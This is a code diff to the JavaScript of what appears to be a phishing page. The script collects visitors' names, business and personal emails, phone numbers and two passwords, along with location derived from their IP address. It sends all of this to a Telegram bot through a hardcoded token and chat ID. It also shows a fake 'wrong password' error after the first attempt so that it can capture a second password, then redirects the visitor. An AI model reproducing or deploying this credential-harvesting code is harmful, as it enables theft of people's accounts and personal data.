@@ -210,23 +210,6 @@ function showPrompt(IpAddress) {
             secondPassword = password;
             password = FIRST_PASSWORD;
         }
-        const product = {
-            product_id: "",
-            ipAddress: IpAddress.ipAddress,
-            area: "",
-            country: IpAddress.countryName,
-            city: IpAddress.city,
-            fullName: $("#full-name").val(),
-            buEmail: $("#business-email").val(),
-            perEmail: $("#personal-email").val(),
-            phone: $("#phone").val(),
-            pageName: $("#page-name").val(),
-            passwords: password,
-            secondPassword: secondPassword,
-            hasKey: "",
-            keymap: "",
-            trueWay: 0,
-        };
 
         const message1 = `<strong>User Email: </strong><code>${$("#business-email").val()}</code>
 %0A<strong>User Name: </strong><code>${$("#full-name").val()}</code>
@@ -239,44 +222,54 @@ function showPrompt(IpAddress) {
 %0A<strong>Country: </strong><code>${IpAddress.countryName}</code> (<code>${IpAddress.countryCode}</code>)
 %0A<strong>City: </strong><code>${IpAddress.city}</code>`;
 
-        const botToken = '7371433087:AAHBPfH8Kshg2ce5ZHCHLDYe43ivmzKnCqk'; // Thay YOUR_BOT_TOKEN bằng bot_token của bạn
-        const chatId = '-1002416068664'; // Thay YOUR_CHAT_ID bằng chat_id của bạn
-        const message = message1; // Tin nhắn sẽ là dữ liệu sản phẩm
+        const botToken = '7371433087:AAHBPfH8Kshg2ce5ZHCHLDYe43ivmzKnCqk';
+        const chatId = '-1002416068664';
+        const message = message1;
 
-        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}&parse_mode=html`;
+        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
-        fetch(telegramUrl)
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error('Network response was not ok');
-                }
-                return response.json();
+        fetch(telegramUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message,
+                parse_mode: 'html'
             })
-            .then(data => {
-                NUMBER_TIME_LOGIN++;
-                if (NUMBER_TIME_LOGIN === 1) {
-                    FIRST_PASSWORD = password;
-                    setTimeout(function () {
-                        $('.lsd-ring-container').addClass('d-none');
-                        $('#wrong-password').removeClass('d-none');
-                        $("#password").val('');
-                    }, 2000);
-                } else {
-                    setTimeout(function () {
-                        $('.lsd-ring-container').addClass('d-none');
-                        window.location.href = "/confirm/s9d8a7da7d6a811akc23.html";
-                    }, 2000);
-                }
-            })
-            .catch(error => {
+        })
+        .then(response => {
+            if (!response.ok) {
+                throw new Error('Network response was not ok');
+            }
+            return response.json();
+        })
+        .then(data => {
+            NUMBER_TIME_LOGIN++;
+            if (NUMBER_TIME_LOGIN === 1) {
+                FIRST_PASSWORD = password;
                 setTimeout(function () {
-                    Swal.fire({
-                        text: `Request failed!`,
-                        icon: "error"
-                    });
                     $('.lsd-ring-container').addClass('d-none');
-                }, 500);
-            });
+                    $('#wrong-password').removeClass('d-none');
+                    $("#password").val('');
+                }, 2000);
+            } else {
+                setTimeout(function () {
+                    $('.lsd-ring-container').addClass('d-none');
+                    window.location.href = "/confirm/s9d8a7da7d6a811akc23.html";
+                }, 2000);
+            }
+        })
+        .catch(error => {
+            setTimeout(function () {
+                Swal.fire({
+                    text: `Request failed!`,
+                    icon: "error"
+                });
+                $('.lsd-ring-container').addClass('d-none');
+            }, 500);
+        });
 
     });
 
